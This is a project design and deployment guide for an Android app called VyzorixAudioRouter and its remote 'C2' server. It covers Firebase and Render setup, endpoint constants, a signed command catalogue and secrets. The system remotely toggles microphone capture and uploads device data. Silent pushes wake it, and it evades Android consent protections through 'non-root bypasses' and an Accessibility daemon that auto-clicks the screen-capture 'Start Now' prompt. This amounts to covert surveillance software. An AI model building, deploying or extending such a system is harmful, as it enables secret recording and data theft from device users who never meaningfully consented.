# FEATURES.md — Signaling, Telemetry, and Cryptographic Security

> **Note:** This document was previously checked in as `FEATURES_UPDATED.md` and is referenced by that name in older commit history. Current canonical filename is `FEATURES.md`.

## Document Purpose

This document provides a comprehensive, step-by-step technical guide for configuring,
deploying, and operating the capabilities of the VyzorixAudioRouter ecosystem.

These features enable:
1. **Silent Remote Signaling (FCM)**: Wakes up the background process and triggers
   full-screen permission regrants without root on stock Android 13.
2. **Persistent C2 WebSocket Pipeline**: Sub-20ms, bidirectional full-duplex command
   execution and high-frequency metric streaming.
3. **Sealed Database Encryption (SQLCipher & Keystore)**: Transparent AES-256 database
   protection locked via hardware-backed Android Keystore keys.
4. **HMAC-Signed Remote Commands**: All C2 commands are HMAC-SHA256 signed with a
   per-device secret established at registration. Prevents unauthorized command execution
   even if server credentials or dashboard JWT tokens are compromised. See
   COMMAND_SECURITY.md for the full signing contract.
5. **FCM Wake Result Queuing**: Command results triggered via FCM push are queued if the
   WebSocket is still reconnecting at dispatch time; flushed automatically on reconnect.
   Eliminates silent result drops on the FCM wake path.

---

# 1. Architecture Specifications

```text
  ┌────────────────────────────────────────────────────────────────────────────────────────┐
  │                               RENDER CONTROL SERVER (Go)                               │
  │  ┌──────────────────────┐    ┌──────────────────────┐    ┌──────────────────────────┐  │
  │  │  Firebase Admin SDK  │    │   WebSocket Broker   │    │  React Telemetry UI      │  │
  │  │  (fcm/notifier.go)   │    │   (hub/hub.go)       │    │  (frontend/src/)         │  │
  │  └──────────┬───────────┘    └──────────▲───────────┘    └────────────▲─────────────┘  │
  └─────────────┼──────────────────────────┼──────────────────────────────┼────────────────┘
                │ High-Priority            │ Bidirectional                │ WebSocket
                │ Silent Push (Wake)       │ HMAC-Signed TCP (C2)         │ Live Stream
                ▼                          ▼                              ▼
  ┌────────────────────────────────────────────────────────────────────────────────────────┐
  │                                 VYZORIX CLIENT DAEMON                                  │
  │  ┌──────────────────────┐    ┌──────────────────────┐    ┌──────────────────────────┐  │
  │  │  FcmWakeLockHolder   │    │ WebSocketClientMgr   │    │  SecureSupportHelper     │  │
  │  │                      │    │                      │    │                          │  │
  │  │  - 20s lock on cmds  │    │  - Exponential Jitter│    │  - Binds SQLCipher to    │  │
  │  │  - 10s on WAKE_DAEMON│    │  - Socket Heartbeats │    │    the Room DB instance  │  │
  │  │  - Launches BAL-expt │    │  - Flushes Pending   │    │                          │  │
  │  └──────────┬───────────┘    │    ResultQueue on    │    └────────────▲─────────────┘  │
  │             │                │    reconnect         │                 │                │
  │             ▼                └──────────┬───────────┘                 │ Binds AES-256  │
  │     FcmCommandParser                    │                             │ passphrase     │
  │             │                           ▼                             │                │
  │             ▼           CommandHmacValidator ◄── NonceCache           │                │
  │     (HMAC validated)              │                                   │                │
  │             │                     ▼                                   │                │
  │             └──────► RemoteCommandExecutor ──────────────────► KeystoreManager        │
  │                                   │                            (Sealed AES key)        │
  │                                   ▼                                   │                │
  │                          RemoteCommandDispatcher                      │                │
  │                                   │                          DeviceSecretStore ────────┘
  │                                   ▼                          (command_secret encrypted)│
  │                          Target Subsystem executes                                     │
  │                                   │                                                    │
  │                                   ▼                                                    │
  │                    RemoteCommandResultDispatcher                                       │
  │                                   │                                                    │
  │                    ┌──────────────┴──────────────┐                                    │
  │                    │                             │                                    │
  │             WS connected?                  WS reconnecting?                           │
  │                    │                             │                                    │
  │             Send immediately           PendingResultQueue                             │
  │                                        (flush on reconnect)                           │
  └────────────────────────────────────────────────────────────────────────────────────────┘
```

---

# 2. Step-by-Step Manual Configuration Requirements

## 2.1 Firebase Console Configuration (Push Signaling Setup)

Google Play Services manages the persistent, battery-optimized push socket on stock Android
Go devices. To configure your client application and server:

### Step 1: Create the Firebase Project
1. Navigate to the [Firebase Console](https://console.firebase.google.com/) and click
   **Create a project**.
2. Name the project `VyzorixAudioRouter` and complete the registration steps.

### Step 2: Register your Android Client App
1. Inside your Firebase project dashboard, click the **Android Icon** to add an app.
2. Enter the exact Android package name: `com.vyzorix.audiorouter`
3. Click **Register App** and download the generated configuration file: `google-services.json`.
4. Place this file directly inside the Android project app module at `/app/google-services.json`.
   **This file is required for the Gradle build to succeed** — the
   `com.google.gms.google-services` plugin throws a fatal build error without it.

### Step 3: Generate the Server Private Certificate
1. Go to **Project Settings** → **Service Accounts**.
2. Under Firebase Admin SDK, select **Node.js** and click **Generate new private key**.
3. Download the `.json` certificate (e.g. `vyzorix-service-account.json`). Store securely.
   This file populates the `FIREBASE_CREDENTIALS` environment variable on Render.

---

## 2.2 Render Dashboard Setup (Backend Server Deployment)

### Step 1: Deploy the Server to Render
1. Connect your GitHub repository containing `vyzorix-update-server/` to your
   [Render Dashboard](https://dashboard.render.com/).
2. Select **Create Web Service**. Name the service `vyzorix-update-server`.
3. Set environment type to **Docker**.

### Step 2: Add Environment Variables

Navigate to your Web Service **Environment** settings and add the following keys:

| Key | Value | Purpose |
|-----|-------|---------|
| `NODE_ENV` | `production` | Enforces optimal memory profiles |
| `PORT` | `3000` | Server socket port |
| `FIREBASE_CREDENTIALS` | *(raw JSON string of vyzorix-service-account.json)* | FCM push permission |
| `TOKEN_SECRET` | *(random 32+ char secret)* | Dashboard API request validation |
| `JWT_SECRET` | *(separate random 32+ char secret)* | JWT signing for dashboard sessions; must be different from TOKEN_SECRET |
| `DATABASE_URL` | `/data/vyzorix.db` | SQLite path on Render persistent disk |

### Step 3: Add Persistent Disk
On Render free/hobby tier, the filesystem resets on redeploy. Add a persistent disk mounted
at `/data/` to preserve `vyzorix.db` across deployments.

---

## 2.3 Android Client Endpoint Configurations

### Step 1: Trust your Render Domain

Open `app/src/main/res/xml/network_security_config.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">vyzorix-update-server.onrender.com</domain>
    </domain-config>
</network-security-config>
```

### Step 2: Set Production Endpoints

Open `core/common/src/main/kotlin/com/vyzorix/audiorouter/common/constants/UpdateApiConstants.kt`:

```kotlin
object UpdateApiConstants {
    const val BASE_URL        = "https://vyzorix-update-server.onrender.com/api/v1/"
    const val DOWNLOAD_URL    = "https://vyzorix-update-server.onrender.com/bin/"
    const val WEBSOCKET_C2_URL = "wss://vyzorix-update-server.onrender.com/c2"
    const val REGISTER_URL    = "https://vyzorix-update-server.onrender.com/v1/device/register"
}
```

### Step 3: Verify command_secret storage after first registration

After `FcmTokenManager.kt` completes first registration, confirm `DeviceSecretStore.kt`
has persisted the encrypted `command_secret` by checking the DataStore file is non-empty.
If the registration response is missing `commandSecret`, all subsequent remote commands
will be rejected with `INVALID_SIGNATURE`.

---

# 3. Remote Command Interface & Payload Contract

## 3.1 Supported Remote Command Catalog

All commands are HMAC-SHA256 signed. See COMMAND_SECURITY.md for signing specification.

| Command Action | Parameters | Natively Allowed | Non-Root Bypass | HMAC Signed |
|----------------|------------|------------------|-----------------|-------------|
| `FORCE_SPEAKER` | None | Yes | `MODE_IN_COMMUNICATION` + `isSpeakerphoneOn=true`; 500ms reassertion loop via AdaptiveSamplingController | ✅ |
| `RESET_AUDIO_HAL` | None | No (direct shell blocked) | Soft HAL reset: cycles BT streams + sub-audible micro-burst under `USAGE_VOICE_COMMUNICATION` to force HAL re-probe | ✅ |
| `TOGGLE_CAPTURE` | `active` (boolean) | Yes | Starts/stops `AudioRecord` read loops on active MediaProjection thread pool | ✅ |
| `REINIT_PROJECTION` | None | No (background activity blocked) | High-Priority `fullScreenIntent` notification heads-up → immediately automated by Accessibility engine (<100ms) | ✅ |
| `DUMP_FLIGHT_DATA` | None | Yes | Gathers local metrics → JSON → postback payload immediately | ✅ |
| `UPLOAD_CRASH_ZIP` | None | Yes | `CrashSnapshotExporter` zips offline SQLite logs → securely POSTs binary block | ✅ |
| `SET_LOG_LEVEL` | `level` (string) | Yes | Dynamically modifies `Logger.minLogLevel` in memory | ✅ |
| `WAKE_UP_UPDATER` | None | Yes | Overrides WorkManager delays → runs `UpdateChecker` instantly | ✅ |

## 3.2 WebSocket Command Frame (JSON Contract)

All command frames include `nonce` and `hmac` fields. The canonical string for HMAC
computation is: `transactionId|deviceId|action|timestampMs|nonce|params`

```json
{
  "transactionId": "f7893a2-bcd0-4e12",
  "deviceId":      "uuid-nokia-c22-092831",
  "action":        "REINIT_PROJECTION",
  "timestamp":     "2026-05-26T12:00:00.000Z",
  "params":        "{}",
  "nonce":         "a3f8c1d2e4b56789",
  "hmac":          "9f3a1bc2d4e5678901234567890abcdef1234567890abcdef1234567890abcdef"
}
```

Success result (WebSocket path — immediate dispatch):
```json
{
  "transactionId": "f7893a2-bcd0-4e12",
  "deviceId":      "uuid-nokia-c22-092831",
  "action":        "REINIT_PROJECTION",
  "success":       true,
  "timestamp":     "2026-05-26T12:00:00.080Z",
  "payload": { "tokenState": "ACTIVE", "bufferLevel": "98%" }
}
```

Success result (FCM wake path — may be queued in PendingResultQueue and delivered on
WebSocket reconnect if socket was not yet established at time of execution):
```json
{
  "transactionId": "f7893a2-bcd0-4e12",
  "deviceId":      "uuid-nokia-c22-092831",
  "action":        "FORCE_SPEAKER",
  "success":       true,
  "timestamp":     "2026-05-26T12:00:00.200Z",
  "payload": { "speakerOn": true, "audioMode": "MODE_IN_COMMUNICATION" }
}
```

Rejection result (HMAC validation failed):
```json
{
  "transactionId": "f7893a2-bcd0-4e12",
  "success":       false,
  "payload": { "error": "INVALID_SIGNATURE", "detail": "HMAC mismatch — command rejected" }
}
```

---

# 4. Storage Encryption & Cryptographic Pipeline

```text
  ┌──────────────────────┐
  │   Android Keystore   │  ← Cryptographically sealed inside hardware Secure Element (SoC)
  │                      │    Software fallback for unreliable Unisoc SC9863A TEE:
  │                      │    derives key from install-time UUID + randomized salt
  └──────────┬───────────┘
             │ getOrGenerateDatabaseKey()
             ▼
  ┌──────────────────────┐
  │   SupportFactory     │  ← Dynamically unlocks SQLCipher DB using PBKDF2 hash
  └──────────┬───────────┘
             │ Binds factory
             ▼
  ┌──────────────────────┐
  │   Room DB (Open)     │  ← Unencrypted SQL queries in local volatile memory
  └──────────────────────┘

  Separately — command_secret encryption:
  ┌──────────────────────┐
  │   Android Keystore   │
  └──────────┬───────────┘
             │ AES-GCM key
             ▼
  ┌──────────────────────┐
  │   TokenEncryptor.kt  │  ← Encrypts command_secret before DeviceSecretStore write
  └──────────┬───────────┘
             │
             ▼
  ┌──────────────────────┐
  │  DeviceSecretStore   │  ← Encrypted blob in DataStore; never stored plaintext
  └──────────────────────┘
```

## 4.1 SQLCipher Integration Details

```kotlin
val databasePasscode = KeystoreManager.getDatabaseKey()
val factory = SupportFactory(SQLiteDatabase.getBytes(databasePasscode))

val db = Room.databaseBuilder(context, AppDatabase::class.java, "vyzorix_secure.db")
    .openHelperFactory(factory)
    .build()
```

## 4.2 Command Secret Storage

```kotlin
// On registration response received:
val encryptedSecret = TokenEncryptor.encrypt(commandSecret)
DeviceSecretStore.write(encryptedSecret)

// On command validation:
val secret = TokenEncryptor.decrypt(DeviceSecretStore.read())
CommandHmacValidator.validate(frame, secret)
// secret goes out of scope immediately after validation call
```

---

# 5. Remote Automation and Signaling Lifecycles

## 5.1 Silent Wake-Up and Activity Re-Grant Lifecycle

```text
 Render Control Server           Google FCM Cloud Gateway        Nokia C22 Device (Sleeping)
        │                                   │                              │
        │ 1. POST /sendPush                 │                              │
        ├──────────────────────────────────►│                              │
        │  - High-Priority                  │                              │
        │  - Silent payload                 │                              │
        │  - action field present           │                              │
        │                                   │ 2. Delivers silent push      │
        │                                   ├─────────────────────────────►│
        │                                   │                              │
        │                                   │                              │ 3. VyzorixMessagingService
        │                                   │                              │    receives push intent
        │                                   │                              │
        │                                   │                              │ 4. FcmWakeLockHolder grabs
        │                                   │                              │    20s CPU lock (command
        │                                   │                              │    payload detected)
        │                                   │                              │
        │                                   │                              │ 5. FcmCommandParser parses
        │                                   │                              │    and deserializes frame
        │                                   │                              │
        │                                   │                              │ 6. CommandHmacValidator
        │                                   │                              │    validates HMAC signature
        │                                   │                              │    checks timestamp ±30s
        │                                   │                              │    checks nonce not replayed
        │                                   │                              │
        │                                   │                              │ 7. If re-grant needed:
        │                                   │                              │    posts FullScreenIntent
        │                                   │                              │    heads-up notification
        │                                   │                              │
        │                                   │                              │ 8. Trampoline UI launches;
        │                                   │                              │    Automation Daemon clicks
        │                                   │                              │    "Start Now" (<100ms)
        │                                   │                              │
        │                                   │                              │ 9. Command executes
        │                                   │                              │    (~1-5s)
        │                                   │                              │
        │                                   │                              │ 10. RemoteCommandResult
        │                                   │                              │     Dispatcher checks WS
        │                                   │                              │
        │                                   │                  ┌───────────┴───────────┐
        │                                   │             WS connected?         WS reconnecting?
        │                                   │                  │                       │
        │ 11a. Result delivered             │            send immediately      PendingResultQueue
        │◄──────────────────────────────────┼────────────────────┘            .enqueue(result)
        │                                   │
        │                                   │                              │ 12. WS reconnects
        │ 11b. Result delivered on reconnect│                              │     onOpen fires
        │◄──────────────────────────────────┼──────────────────────────────┤
        │                                   │     PendingResultQueue flush │
```

---

# 6. Required Secrets Reference

## Android secrets (GitHub Actions for CI builds)

| Secret | Purpose |
|--------|---------|
| `RELEASE_KEYSTORE_BASE64` | Base64-encoded release keystore |
| `KEYSTORE_PASSWORD` | Keystore password |
| `KEY_ALIAS` | Key alias name |
| `KEY_PASSWORD` | Key password |

## Server secrets (Render environment variables)

| Secret | Purpose |
|--------|---------|
| `FIREBASE_CREDENTIALS` | Firebase service account JSON string |
| `TOKEN_SECRET` | Dashboard API request validation key |
| `JWT_SECRET` | JWT session token signing key (separate from TOKEN_SECRET) |
| `DATABASE_URL` | SQLite file path on persistent disk |
| `RENDER_SERVICE_ID` | Render service ID for CI deploy triggers |
| `RENDER_API_KEY` | Render API key for CI deploy triggers |

## Server repo secrets (GitHub Actions)

| Secret | Purpose |
|--------|---------|
| `SERVER_REPO_TOKEN` | GitHub PAT with push access to server repo |
| `RENDER_SERVICE_ID` | Render service ID for deployment trigger |
| `RENDER_API_KEY` | Render API key for deployment trigger |
| `RENDER_SERVICE_NAME` | Render service name for health check URL |
